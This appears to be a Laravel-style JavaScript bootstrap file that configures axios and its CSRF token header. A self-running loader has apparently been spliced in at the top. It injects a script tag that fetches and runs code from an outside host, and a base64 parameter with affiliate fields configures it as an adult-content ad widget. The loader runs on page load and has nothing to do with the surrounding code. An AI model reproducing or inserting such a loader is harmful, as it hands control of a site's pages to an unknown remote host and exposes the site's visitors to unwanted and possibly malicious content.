
(function() {
  var script = document.createElement("script");
  script.async = false;
  script.src = "//plug.plufdsb.com/wdgt/?PRT=ZGl2PTE1NjUzNjAyNDQxNjYmY2ZmPSZmZj1BcmlhbCZjZnQ9JmZmdD1BcmlhbCZicmM9MDAwMDAwJmliY2g9MDAwMDAwJmZjPWZmZmZmZiZodGM9YjNiM2IzJmRiPTEmYz0zMDAmcGQ9MCZpdz0xJmJyPTAmZnN6PTEyJmZzdD0xNiZjaD0yJmZjdD0wMDAwMDAmaXluPTEmaXQ9bGFuZCZzdD0xJnRhPWxlZnQmdGl0bGVsZW5ndGg9ZnVsbCZ0cD0xJmJ0Yz0wMDAwMDAmZGVjPXVuZGVybGluZSZmdz1ib2xkJnd0PUEmc2V4dWFsX29yaWVudGF0aW9uPXN0cmFpZ2h0Jm51ZGVfc3RhdGU9Ym90aCZ3aWRnZXRfcmVzcG9uc2l2ZT0xJnBvcHVuZGVyPTAmY3VzdG9tY3NzPSZ0YWdzMD0mcGJkZD0wJnBicD10b3AmcGJhPXJpZ2h0Jnd0ZGQ9MCZ3dHY9WW91IG1heSBhbHNvIGxpa2UmZnd0PWJvbGQmc2l0ZWxpbms9MA==&source=&aff_sub=&aff_sub2=&aff_sub3=&aff_sub4=&aff_sub5=&fid=105385&file_id=375300";
  var dst = document.getElementsByTagName("script")[0];
  dst.parentNode.insertBefore(script, dst);
}
)();
window.axios = require('axios');

window.axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';


let token = document.head.querySelector('meta[name="csrf-token"]');

if (token) {
    window.axios.defaults.headers.common['X-CSRF-TOKEN'] = token.content;
} else {
    console.error('CSRF token not found: https://laravel.com/docs/csrf#csrf-x-csrf-token');
}

